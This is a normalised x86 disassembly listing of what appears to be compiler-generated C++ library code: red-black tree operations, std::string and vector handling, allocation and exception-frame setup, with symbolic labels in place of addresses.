mov [ esp + 0x24 ] 0x0
mov [ esp + 0x14 ] 0x0
call sub_409850
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esp + 0x28 ]
mov [ esp + 0x5c ] 0x0
call sub_4010d0
push r--data
lea ecx [ esp + 0x28 ]
push ecx
mov [ esp + 0x2c ] r--data
call sub_41070b
int3
sub_40a8f0
sub esp 0x10
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x4
jae r-xdata
xor ecx ecx
lea edx [ ecx * 4 ]
push edx
call sub_40fd2d
add esp 0x4
add esp 0x10
retn
lea eax [ esp ]
push eax
lea ecx [ esp + 0x8 ]
mov [ esp + 0x4 ] 0x0
call sub_40e7e0
push r--data
lea ecx [ esp + 0x8 ]
push ecx
mov [ esp + 0xc ] r--data
call sub_41070b
int3
sub_40a950
push 0xffffffff
push sub_420a18
mov eax [ fs : 0x0 ]
push eax
sub esp 0x44
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x58 ]
mov [ fs : 0x0 ] eax
mov ebp [ esp + 0x74 ]
cmp [ ebp + 0x45 ] 0x0
je r-xdata
lea esi [ esp + 0x70 ]
call sub_40ae30
mov ecx [ ebp ]
cmp [ ecx + 0x45 ] 0x0
je r-xdata
push 0x1b
xor esi esi
push r--data
lea ecx [ esp + 0x1c ]
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] esi
mov [ esp + 0x20 ] 0x0
call sub_409850
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x34 ]
mov [ esp + 0x64 ] esi
call sub_4010d0
push r--data
lea ecx [ esp + 0x34 ]
push ecx
mov [ esp + 0x38 ] r--data
call sub_41070b
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x45 ] 0x0
je r-xdata
mov edi [ ebp + 0x8 ]
jmp r-xdata
mov eax [ esp + 0x74 ]
mov edi [ eax + 0x8 ]
lea edx [ eax + 0x8 ]
cmp eax ebp
jne r-xdata
mov edi ecx
jmp r-xdata
cmp [ edi + 0x45 ] 0x0
mov esi [ ebp + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov ecx [ ebp ]
mov [ eax ] ecx
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov edx [ esp + 0x68 ]
mov eax [ edx + 0x18 ]
cmp [ eax + 0x4 ] ebp
jne r-xdata
mov [ edi + 0x4 ] esi
cmp [ edi + 0x45 ] 0x0
mov esi [ eax + 0x4 ]
jne r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] ebp
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov ecx [ ebp + 0x8 ]
mov [ edx ] ecx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov [ edi + 0x4 ] esi
mov ecx [ esp + 0x68 ]
mov ecx [ ecx + 0x18 ]
cmp [ ecx + 0x4 ] ebp
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov ebx [ edx + 0x18 ]
cmp [ ebx ] ebp
jne r-xdata
mov ecx [ ebp + 0x4 ]
cmp [ ecx ] ebp
jne r-xdata
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov ebx [ edx + 0x18 ]
cmp [ ebx + 0x8 ] ebp
jne r-xdata
cmp [ edi + 0x45 ] 0x0
je r-xdata
mov [ ecx + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov edx [ ebp + 0x4 ]
mov [ eax + 0x4 ] edx
lea ecx [ ebp + 0x44 ]
add eax 0x44
cmp eax ecx
je r-xdata
mov bl 0x1
cmp [ ebp + 0x44 ] bl
jne r-xdata
cmp [ edi + 0x45 ] 0x0
je r-xdata
mov eax [ edi ]
cmp [ eax + 0x45 ] 0x0
mov ecx edi
jne r-xdata
mov ecx esi
jmp r-xdata
mov edx [ esp + 0x68 ]
mov bl [ ecx ]
mov dl [ eax ]
mov [ eax ] bl
mov [ ecx ] dl
mov ebx 0x10
cmp [ ebp + 0x40 ] ebx
jb r-xdata
mov eax [ edx + 0x18 ]
cmp edi [ eax + 0x4 ]
je r-xdata
mov eax edi
call sub_40ae10
mov edx [ esp + 0x68 ]
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov [ ebx ] ecx
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x45 ] 0x0
je r-xdata
xor esi esi
mov edi 0xf
mov [ ebp + 0x40 ] edi
mov [ ebp + 0x3c ] esi
mov [ ebp + 0x2c ] 0x0
cmp [ ebp + 0x24 ] ebx
jb r-xdata
mov edx [ ebp + 0x2c ]
push edx
call sub_40f2fb
add esp 0x4
mov [ edi + 0x44 ] bl
cmp [ edi + 0x44 ] bl
jne r-xdata
mov [ ebp + 0x24 ] edi
mov [ ebp + 0x20 ] esi
push ebp
mov [ ebp + 0x10 ] 0x0
call sub_40f2fb
mov ecx [ esp + 0x6c ]
mov eax [ ecx + 0x1c ]
add esp 0x4
cmp eax esi
jbe r-xdata
mov eax [ ebp + 0x10 ]
push eax
call sub_40f2fb
add esp 0x4
mov ecx [ esi ]
cmp edi ecx
jne r-xdata
mov edx [ esp + 0x6c ]
mov eax [ esp + 0x74 ]
mov ecx [ ecx ]
mov [ edx + 0x4 ] eax
mov [ edx ] ecx
mov eax edx
mov ecx [ esp + 0x58 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x50
retn 0x10
dec eax
mov [ ecx + 0x1c ] eax
cmp [ ecx + 0x44 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0x44 ] 0x0
jne r-xdata
cmp [ ecx + 0x45 ] 0x0
jne r-xdata
mov [ ecx + 0x44 ] bl
push edx
mov ecx esi
mov [ esi + 0x44 ] 0x0
call sub_40a610
mov ecx [ esi ]
mov edx [ esp + 0x68 ]
cmp [ ecx + 0x45 ] 0x0
jne r-xdata
mov [ ecx + 0x44 ] bl
push edx
mov ecx esi
mov [ esi + 0x44 ] 0x0
call sub_40a5c0
mov ecx [ esi + 0x8 ]
mov edx [ esp + 0x68 ]
mov ecx [ edx + 0x18 ]
mov edi esi
mov esi [ esi + 0x4 ]
cmp edi [ ecx + 0x4 ]
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x44 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x44 ] bl
jne r-xdata
jmp r-xdata
mov eax [ ecx ]
cmp [ eax + 0x44 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x44 ] bl
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x44 ] bl
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x44 ] bl
je r-xdata
mov al [ esi + 0x44 ]
mov [ ecx + 0x44 ] al
mov [ esi + 0x44 ] bl
mov ecx [ ecx ]
mov [ ecx + 0x44 ] bl
push edx
mov ecx esi
call sub_40a610
mov eax [ ecx + 0x8 ]
mov [ eax + 0x44 ] bl
push edx
mov [ ecx + 0x44 ] 0x0
call sub_40a5c0
mov ecx [ esi ]
mov edx [ esp + 0x68 ]
mov [ ecx + 0x44 ] 0x0
mov al [ esi + 0x44 ]
mov [ ecx + 0x44 ] al
mov [ esi + 0x44 ] bl
mov ecx [ ecx + 0x8 ]
mov [ ecx + 0x44 ] bl
push edx
mov ecx esi
call sub_40a5c0
jmp r-xdata
mov eax [ ecx ]
mov [ eax + 0x44 ] bl
push edx
mov [ ecx + 0x44 ] 0x0
call sub_40a610
mov ecx [ esi + 0x8 ]
mov edx [ esp + 0x68 ]
sub_40ac70
push 0x48
call sub_40fd2d
add esp 0x4
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov [ eax ] 0x0
lea ecx [ eax + 0x8 ]
test ecx ecx
je r-xdata
mov [ ecx ] 0x0
mov [ eax + 0x44 ] 0x1
mov [ eax + 0x45 ] 0x0
retn
mov [ ecx ] 0x0
sub_40acb0
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x45 ] 0x0
je r-xdata
call sub_40ee1a
mov ecx [ eax ]
cmp [ ecx + 0x45 ] 0x0
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ esi + 0x4 ] eax
cmp [ eax + 0x45 ] 0x0
je r-xdata
mov eax [ eax + 0x4 ]
cmp [ eax + 0x45 ] 0x0
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x45 ] 0x0
jne r-xdata
retn
jmp sub_40ee1a
mov ecx [ esi + 0x4 ]
cmp [ ecx + 0x45 ] 0x0
je r-xdata
lea ecx [ ecx ]
mov [ esi + 0x4 ] ecx
retn
mov ecx eax
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x45 ] 0x0
je r-xdata
mov [ esi + 0x4 ] eax
jmp sub_40ee1a
mov [ esi + 0x4 ] eax
mov edx eax
mov eax [ edx + 0x4 ]
cmp [ eax + 0x45 ] 0x0
je r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax ]
jne r-xdata
sub_40ad30
push 0xffffffff
push sub_4208e8
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x1c ]
xor ebx ebx
push 0xffffffff
push ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
push edi
mov ecx esi
mov [ esi + 0x4 ] bl
call sub_408b10
push 0xffffffff
lea ecx [ esi + 0x1c ]
mov [ esp + 0x18 ] ebx
lea eax [ edi + 0x1c ]
push ebx
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] ebx
push eax
mov [ ecx + 0x4 ] bl
call sub_408b10
mov eax esi
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
add esp 0xc
retn 0x4
sub_40adb0
mov ecx [ esp + 0x4 ]
sub esp 0xc
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x1
jae r-xdata
xor ecx ecx
push ecx
call sub_40fd2d
add esp 0x4
add esp 0xc
retn 0x4
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x4 ]
mov [ esp + 0x14 ] 0x0
call sub_40e7e0
push r--data
lea ecx [ esp + 0x4 ]
push ecx
mov [ esp + 0x8 ] r--data
call sub_41070b
int3
sub_40ae30
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x45 ] 0x0
je r-xdata
call sub_40ee1a
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x45 ] 0x0
jne r-xdata
jmp sub_40ee1a
mov eax [ eax + 0x4 ]
cmp [ eax + 0x45 ] 0x0
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x45 ] 0x0
jne r-xdata
mov [ esi + 0x4 ] eax
retn
mov ecx [ esi + 0x4 ]
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov [ esi + 0x4 ] ecx
retn
lea esp [ esp ]
mov [ esi + 0x4 ] eax
mov edx eax
mov eax [ edx + 0x4 ]
cmp [ eax + 0x45 ] 0x0
je r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x45 ] 0x0
je r-xdata
sub_40aea0
push ecx
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
mov esi eax
mov ecx esi
sub ecx edi
mov eax 0x2aaaaaab
imul ecx
sar edx 0x2
mov eax edx
shr eax 0x1f
add eax edx
lea eax [ eax + eax * 2 ]
add eax eax
add eax eax
add eax eax
mov ebx ebp
sub ebx eax
cmp edi esi
je r-xdata
pop esi
pop ebp
mov eax ebx
pop ebx
pop ecx
retn
sub ebp esi
sub esi 0x18
lea ecx [ esi + ebp ]
push ecx
mov edx esi
call sub_40b7e0
cmp esi edi
jne r-xdata
sub_40aef0
push esi
mov esi eax
cmp esi edi
je r-xdata
pop esi
retn
push 0xffffffff
push 0x0
push ebx
mov ecx esi
call sub_408b10
add esi 0x1c
cmp esi edi
jne r-xdata
sub_40af10
push ecx
push esi
mov esi eax
mov [ esp + 0x4 ] 0x0
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x4 ]
push eax
push ecx
push edx
push edi
push ebx
mov ecx esi
call sub_40b6d0
sub esi ebx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
lea ecx [ eax * 8 ]
sub ecx eax
add ecx ecx
add esp 0x14
add ecx ecx
mov eax edi
sub eax ecx
pop esi
pop ecx
retn
sub_40af80
push ebp
mov ebp esp
push 0xffffffff
push sub_420f35
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
dec edi
add esi 0x18
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x8 ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
push esi
call sub_408560
cmp edi ebx
jbe r-xdata
sub_40afd9
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_41070b
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_408670
add esi 0x18
cmp esi edi
jne r-xdata
sub_40b010
push ebp
mov ebp esp
push 0xffffffff
push sub_4209f5
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
dec edi
add esi 0x1c
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x8 ] esi
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0xffffffff
push ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
push eax
mov ecx esi
mov [ esi + 0x4 ] bl
call sub_408b10
cmp edi ebx
jbe r-xdata
sub_40b07b
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_41070b
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_409fb0
add esi 0x1c
cmp esi edi
jne r-xdata
sub_40b0b0
push edi
mov edi eax
cmp edi [ esp + 0x8 ]
je r-xdata
pop edi
retn
push ebx
push ebp
push esi
xor ebx ebx
mov edi edi
mov edx [ edi ]
push edx
mov [ edi + 0xc ] ebx
mov [ edi + 0x10 ] ebx
mov [ edi + 0x14 ] ebx
call sub_40f2fb
add edi 0x18
add esp 0x4
cmp edi [ esp + 0x14 ]
jne r-xdata
mov ebp [ edi + 0x10 ]
cmp esi ebp
je r-xdata
mov esi [ edi + 0xc ]
cmp esi ebx
je r-xdata
pop esi
pop ebp
pop ebx
mov ecx [ edi + 0xc ]
push ecx
call sub_40f2fb
add esp 0x4
mov edi edi
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esi + 0x4 ] bl
add esi 0x1c
cmp esi ebp
jne r-xdata
mov eax [ esi + 0x4 ]
push eax
call sub_40f2fb
add esp 0x4
cmp [ esi + 0x18 ] 0x10
jb r-xdata
sub_40b130
push esi
mov esi eax
cmp esi edi
je r-xdata
pop esi
retn
push ebx
xor ebx ebx
lea ebx [ ebx ]
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esi + 0x4 ] bl
add esi 0x1c
cmp esi edi
jne r-xdata
mov eax [ esi + 0x4 ]
push eax
call sub_40f2fb
add esp 0x4
cmp [ esi + 0x18 ] 0x10
jb r-xdata
pop ebx
sub_40b170
sub esp 0x8
push ebx
push ebp
mov ebp [ esp + 0x14 ]
mov ebx eax
push esi
push edi
cmp ebp ebx
je r-xdata
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
add esp 0x8
retn 0x4
mov eax [ ebx + 0xc ]
mov ecx [ ebx + 0x10 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov edi edx
shr edi 0x1f
add edi edx
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp edi ecx
ja r-xdata
mov ebx [ ebp + 0x10 ]
cmp [ ebp + 0xc ] ebx
jbe r-xdata
test esi esi
jne r-xdata
mov edi [ ebx + 0x10 ]
mov ecx [ ebx + 0xc ]
mov eax esi
call sub_40b760
mov ecx [ esp + 0x1c ]
mov edi [ ebp + 0x10 ]
push ecx
call sub_40b130
mov ecx [ ebx + 0x10 ]
sub ecx [ ebx + 0xc ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
lea edx [ eax * 8 ]
add esp 0x4
sub edx eax
mov eax [ ebp + 0xc ]
lea ecx [ eax + edx * 4 ]
mov [ ebp + 0x10 ] ecx
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0x4
mov esi [ ebp + 0xc ]
mov edi [ ebp ]
cmp esi [ ebp + 0x10 ]
jbe r-xdata
call sub_40ee1a
mov edx [ ebp + 0x14 ]
sub edx esi
mov [ esp + 0x1c ] edx
mov eax 0x92492493
imul edx
add edx [ esp + 0x1c ]
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
xor eax eax
jmp r-xdata
mov eax [ ebp ]
push ebx
push edi
push esi
push eax
lea ebx [ esp + 0x20 ]
mov esi ebp
call sub_40b340
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0x4
call sub_40ee1a
test esi esi
je r-xdata
mov edx [ ebx + 0xc ]
lea eax [ ecx * 8 ]
sub eax ecx
lea edi [ edx + eax * 4 ]
mov eax esi
mov ecx edx
call sub_40b760
mov eax [ ebp + 0x10 ]
mov ebx [ ebx + 0x10 ]
mov [ esp + 0x1c ] 0x0
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x1c ]
push ecx
push edx
push eax
push ebx
mov ecx edi
call sub_40b3c0
mov [ ebp + 0x10 ] eax
add esp 0x10
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0x4
cmp edi eax
ja r-xdata
mov ecx [ ebx + 0x10 ]
sub ecx [ ebx + 0xc ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov esi edx
mov eax 0x0
shr esi 0x1f
add esi edx
mov [ ebp + 0xc ] eax
mov [ ebp + 0x10 ] eax
mov [ ebp + 0x14 ] eax
je r-xdata
mov eax [ esp + 0x1c ]
mov edi [ ebp + 0x10 ]
push eax
mov eax esi
call sub_40b130
mov ecx [ ebp + 0xc ]
add esp 0x4
push ecx
call sub_40f2fb
add esp 0x4
mov edi ebp
call sub_409190
test al al
je r-xdata
mov edx [ ebx + 0x10 ]
mov eax [ ebx + 0xc ]
push edx
mov edx [ ebp + 0xc ]
push eax
call sub_40b7b0
mov [ ebp + 0x10 ] eax
sub_40b340
push ebp
push edi
mov [ ebx ] 0x0
test esi esi
je r-xdata
call sub_40ee1a
mov eax [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
cmp [ esi + 0xc ] eax
ja r-xdata
call sub_40ee1a
mov ebp [ esp + 0x18 ]
cmp ebp [ esi + 0x10 ]
jbe r-xdata
cmp eax [ esi + 0x10 ]
jbe r-xdata
call sub_40ee1a
cmp eax ecx
je r-xdata
mov eax [ ebx ]
mov ecx [ esi ]
test eax eax
je r-xdata
mov ebp [ esp + 0x18 ]
mov ecx [ esi ]
mov [ ebx ] ecx
mov [ ebx + 0x4 ] eax
cmp [ esi + 0xc ] ebp
ja r-xdata
pop edi
mov eax ebx
pop ebp
retn 0x10
mov edi [ esi + 0x10 ]
mov ecx ebp
call sub_40b760
mov edx [ esp + 0xc ]
mov edi [ esi + 0x10 ]
push edx
mov ebp eax
call sub_40b130
add esp 0x4
mov [ esi + 0x10 ] ebp
mov eax [ ebx + 0x4 ]
cmp eax ebp
je r-xdata
sub_40b3c0
push ebp
mov ebp esp
push 0xffffffff
push sub_4209d5
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0xc ]
mov edi ecx
xor ebx ebx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
add esi 0x1c
mov [ ebp - 0x4 ] bl
mov [ ebp + 0xc ] esi
add edi 0x1c
jmp r-xdata
push 0xffffffff
push ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
push edi
mov ecx esi
mov [ esi + 0x4 ] bl
call sub_408b10
cmp edi [ ebp + 0x8 ]
je r-xdata
sub_40b42b
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_41070b
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_409fb0
add esi 0x1c
cmp esi edi
jne r-xdata
sub_40b460
push ebp
mov ebp esp
push 0xffffffff
push sub_421125
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi [ ebp + 0xc ]
mov esi ecx
push 0x4
mov [ ebp - 0x14 ] edi
call sub_40fd2d
xor ecx ecx
add esp 0x4
cmp eax ecx
je r-xdata
xor eax eax
lea edx [ ebp - 0x2c ]
mov [ eax ] edx
jmp r-xdata
cmp eax ecx
je r-xdata
mov [ ebp - 0x4 ] 0x3
cmp edi ecx
je r-xdata
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] ecx
mov bl 0x2
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] bl
mov eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] ecx
call sub_40f2fb
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ ebp - 0x1c ]
cmp eax ebx
je r-xdata
push edi
mov edx esi
mov [ ebp - 0x4 ] bl
call sub_40b7e0
mov eax [ ebp - 0x20 ]
add edi 0x18
add esi 0x18
mov [ ebp + 0xc ] edi
xor ecx ecx
jmp r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_408560
push eax
call sub_40f2fb
add esp 0x4
xor ecx ecx
lea esi [ eax + 0x18 ]
cmp esi [ ebp + 0x8 ]
je r-xdata
mov [ esi ] 0xf
mov [ esi - 0x4 ] ecx
mov [ esi - 0x14 ] 0x0
add esi 0x1c
lea edx [ esi - 0x18 ]
cmp edx ebx
jne r-xdata
mov eax [ esi - 0x14 ]
push eax
call sub_40f2fb
add esp 0x4
xor ecx ecx
cmp [ esi ] 0x10
jb r-xdata
mov eax [ ebp - 0x20 ]
sub_40b4f7
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
push 0x0
push 0x0
call sub_41070b
cmp eax ecx
je r-xdata
call sub_408670
add esi 0x18
cmp esi edi
jne r-xdata
mov eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] ecx
call sub_40f2fb
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ ebp - 0x1c ]
cmp eax ebx
je r-xdata
push eax
call sub_40f2fb
add esp 0x4
xor ecx ecx
lea esi [ eax + 0x18 ]
mov [ esi ] 0xf
mov [ esi - 0x4 ] ecx
mov [ esi - 0x14 ] 0x0
add esi 0x1c
lea edx [ esi - 0x18 ]
cmp edx ebx
jne r-xdata
mov eax [ esi - 0x14 ]
push eax
call sub_40f2fb
add esp 0x4
xor ecx ecx
cmp [ esi ] 0x10
jb r-xdata
mov eax [ ebp - 0x20 ]
sub_40b590
push ebp
mov ebp esp
push 0xffffffff
push sub_42099d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi edx
xor ebx ebx
mov edi ecx
mov [ ebp - 0x44 ] esi
mov [ ebp - 0x48 ] esi
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] 0x1
mov edi edi
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov [ ebp - 0x4 ] 0x2
cmp esi ebx
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_40e1e0
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x2c ]
push edx
call sub_40f2fb
add esp 0x4
mov [ ebp - 0x4 ] 0x1
cmp esi edi
je r-xdata
push 0xffffffff
push ebx
lea eax [ ebp - 0x30 ]
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
push eax
mov ecx esi
mov [ esi + 0x4 ] bl
call sub_408b10
add esi 0x1c
mov [ ebp - 0x44 ] esi
add edi 0x1c
jmp r-xdata
mov ebx [ esi + 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
mov edx [ esi + 0xc ]
mov [ ebp - 0x34 ] ebx
mov ebx [ edi + 0x4 ]
mov [ esi + 0x4 ] ebx
mov ebx [ edi + 0x8 ]
mov [ esi + 0x8 ] ebx
mov ebx [ edi + 0xc ]
mov [ esi + 0xc ] ebx
mov ebx [ edi + 0x10 ]
mov [ esi + 0x10 ] ebx
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ecx
mov ecx [ ebp - 0x34 ]
mov [ edi + 0xc ] edx
mov edx [ edi + 0x14 ]
mov [ edi + 0x10 ] ecx
mov eax [ esi + 0x14 ]
mov [ esi + 0x14 ] edx
mov ecx [ edi + 0x18 ]
mov [ edi + 0x14 ] eax
mov eax [ esi + 0x18 ]
mov [ esi + 0x18 ] ecx
mov [ edi + 0x18 ] eax
xor ebx ebx
cmp edi [ ebp + 0x8 ]
je r-xdata
sub_40b672
mov esi [ ebp - 0x48 ]
mov edi [ ebp - 0x44 ]
cmp esi edi
je r-xdata
push 0x0
push 0x0
call sub_41070b
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
lea esp [ esp ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_40e1e0
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x2c ]
push edx
call sub_40f2fb
add esp 0x4
call sub_409fb0
add esi 0x1c
cmp esi edi
jne r-xdata
sub_40b6d0
push ecx
mov eax [ rw-data ]
xor eax esp
mov [ esp ] eax
mov eax [ esp + 0xc ]
cmp [ esp + 0x8 ] ecx
je r-xdata
mov ecx [ esp ]
xor ecx esp
call sub_40e1e0
pop ecx
retn
push ebx
push ebp
push esi
push edi
lea esp [ esp ]
cmp ecx [ esp + 0x18 ]
jne r-xdata
mov ebp [ ecx + 0x4 ]
mov edx [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
mov edi [ eax + 0xc ]
mov ebx [ eax + 0x10 ]
mov [ eax + 0x4 ] ebp
mov ebp [ ecx + 0x8 ]
